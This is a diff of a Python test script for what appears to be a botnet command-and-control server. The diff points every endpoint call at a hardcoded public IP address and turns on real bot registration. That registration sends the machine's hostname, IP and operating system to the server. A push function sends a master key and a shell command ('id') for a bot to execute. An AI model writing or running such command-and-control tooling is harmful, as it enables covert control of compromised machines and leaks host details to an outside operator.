@@ -5,11 +5,8 @@ import platform
 
 registerkey = "registerkey"
 
-#URL = 'http://138.197.74.47:5000'
-URL = 'http://localhost:5000'
-
 def test_firstcontact():
-    url = URL + '/firstcontact'
+    url = 'http://138.197.74.47:5000/firstcontact'
     data = {'firstcontactkey': 'firstcontact'}
     
     res = requests.post(url, data=data)
@@ -17,39 +14,12 @@ def test_firstcontact():
     print ("[+] Testing firstcontact... ")
     print (res.text + '\n')
 
-def test_botpush(bot_id):
-    url = URL + '/bot/' + bot_id + '/push'
-
-    masterkey = 'masterkey'
-    cmd = 'id'
-
-    data = { 'masterkey': masterkey, 'cmd': cmd }
-
-    res = requests.post(url, data=data)
-
-    print ("[+] Testing bot push command... ")
-    print (res.text + '\n')
-
-# God bless stackoverflow 
-def get_ip():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(('10.255.255.255', 1))
-        IP = s.getsockname()[0]
-    except:
-        IP = '127.0.0.1'
-    finally:
-        s.close()
-
-        return IP 
-
 def test_register():
-    url = URL + '/register'
+    url = 'http://138.197.74.47:5000/register'
 
     registerkey = "registerkey"
     hostname = socket.gethostname()
-    #host_ip = socket.gethostbyname(hostname)
-    host_ip = get_ip()
+    host_ip = socket.gethostbyname(hostname)
 
     if "Linux" in platform.platform():
         host_os = 'Nix'
@@ -65,9 +35,22 @@ def test_register():
     print ("[+] Testing register... ")
     print (res.text + '\n')
 
+def test_botpush(bot_id):
+    url = 'http://138.197.74.47:5000/bot/' + bot_id + '/push'
+
+    masterkey = 'masterkey'
+    cmd = 'id'
+
+    data = { 'masterkey': masterkey, 'cmd': cmd }
+
+    res = requests.post(url, data=data)
+
+    print ("[+] Testing bot push command... ")
+    print (res.text + '\n')
+
 
 def test_dummyregister(ip):
-    url = URL + '/register'
+    url = 'http://138.197.74.47:5000/register'
 
     ip = ip
     os = 'Nix'
@@ -80,7 +63,7 @@ def test_dummyregister(ip):
     print(res.text)
 
 def test_botlist():
-    url = URL + '/bot/list'
+    url = 'http://138.197.74.47:5000/bot/list'
 
     res = requests.get(url)
 
@@ -89,13 +72,13 @@ def test_botlist():
 def main():
     test_firstcontact()
 
-    #test_register()
+    test_register()
 
-    test_dummyregister('127.0.0.1')
-    test_dummyregister('127.0.0.2')
-    test_dummyregister('127.0.0.3')
-    test_dummyregister('127.0.0.4')
-    test_dummyregister('127.0.0.5')
+    #test_dummyregister('127.0.0.1')
+    #test_dummyregister('127.0.0.2')
+    #test_dummyregister('127.0.0.3')
+    #test_dummyregister('127.0.0.4')
+    #test_dummyregister('127.0.0.5')
 
     #test_botpush('3')
 
